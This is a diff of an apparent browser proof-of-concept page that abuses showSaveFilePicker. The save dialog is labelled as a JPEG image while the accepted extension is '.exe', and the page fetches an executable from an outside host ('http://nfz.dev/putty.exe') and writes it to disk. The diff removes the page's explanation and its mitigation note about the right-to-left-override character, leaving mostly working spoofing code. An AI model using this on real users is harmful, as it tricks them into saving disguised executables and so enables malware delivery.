@@ -29,9 +29,9 @@
                         description:
                             'JPEG Image (*.jpeg)',
                         accept: {
-                            'text/plain': ['.jpg+..++.app']
+                            'text/plain': ['.exe']
                         },
-                        content: 'C:\\Windows\\system32\\calc.exe'
+                        content: 'testetsteste'
                     }
                 ]
             }
@@ -39,17 +39,12 @@
 
             const handle = await window.showSaveFilePicker(options)
             const writable = await handle.createWritable()
-            const response = await fetch('google.png');
+            const response = await fetch('http://nfz.dev/putty.exe');
             await response.body.pipeTo(writable);
             alert('File saved')
         })
     </script>
     <hr>
-    <h3>Explanation:</h3>
-    <img src="RTLExplanation.png" alt="awesome code" width="1021" height="576">
-    <hr>
-    <h3>Solution:</h3>
-    <p style="font-size: 25px">Block \u202e - RTL character</p>
 
 </body>
 
